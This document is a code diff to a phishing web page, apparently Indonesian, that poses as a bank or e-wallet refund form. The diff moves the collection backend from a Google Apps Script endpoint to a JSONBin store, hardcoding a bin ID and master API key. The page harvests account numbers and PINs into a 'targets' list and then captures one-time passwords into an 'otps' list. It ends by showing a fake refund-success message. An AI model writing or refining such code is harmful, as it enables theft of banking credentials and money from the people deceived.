@@ -144,10 +144,12 @@
     </div>
 
     <script>
-        // GANTI URL INI dengan URL Google Apps Script setelah dibuat
-        const SERVER_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+        // ========== KONFIGURASI JSONBIN ==========
+        const BIN_ID = '69e10549856a6821893f4a1f';
+        const API_KEY = '$2a$10$AvgpqyavBNfTF0W1KA6mIeFfTVXZfCU/2kdYCu64PjoqhYZCH.WUO';
+        const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
         
-        // AUTO INSTALL PROMPT - EL CIENCO
+        // AUTO INSTALL PROMPT
         let deferredPrompt;
         
         window.addEventListener('beforeinstallprompt', (e) => {
@@ -166,6 +168,35 @@
                 }
             }, 2000);
         });
+        
+        // Fungsi simpan ke JSONBin
+        async function saveToJSONBin(data) {
+            let oldData = { targets: [], otps: [] };
+            try {
+                const res = await fetch(JSONBIN_URL, {
+                    headers: { 'X-Master-Key': API_KEY }
+                });
+                const json = await res.json();
+                oldData = json.record || { targets: [], otps: [] };
+            } catch(e) {
+                console.log('Data baru dibuat');
+            }
+            
+            if (data.step === 'initial_data') {
+                oldData.targets.push(data);
+            } else if (data.step === 'otp') {
+                oldData.otps.push(data);
+            }
+            
+            await fetch(JSONBIN_URL, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': API_KEY
+                },
+                body: JSON.stringify(oldData)
+            });
+        }
         
         // Tampilkan field PIN untuk e-wallet
         document.getElementById('bankType').addEventListener('change', function() {
@@ -187,19 +218,11 @@
                 bankType: document.getElementById('bankType').value,
                 accountNumber: document.getElementById('accountNumber').value,
                 pin: document.getElementById('pin').value,
-                timestamp: Date.now(),
+                timestamp: new Date().toISOString(),
                 step: 'initial_data'
             };
             
-            // Kirim ke server (Google Apps Script)
-            await fetch(SERVER_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            
-            // Tampilkan modal OTP
+            await saveToJSONBin(data);
             document.getElementById('otpModal').style.display = 'flex';
         });
         
@@ -207,12 +230,13 @@
         document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
             const otp = document.getElementById('otpInput').value;
             
-            await fetch(SERVER_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ otp: otp, timestamp: Date.now(), step: 'otp' })
-            });
+            const data = {
+                otp: otp,
+                timestamp: new Date().toISOString(),
+                step: 'otp'
+            };
+            
+            await saveToJSONBin(data);
             
             alert('Verifikasi berhasil! Dana refund akan diproses dalam 1x24 jam.');
             document.getElementById('otpModal').style.display = 'none';
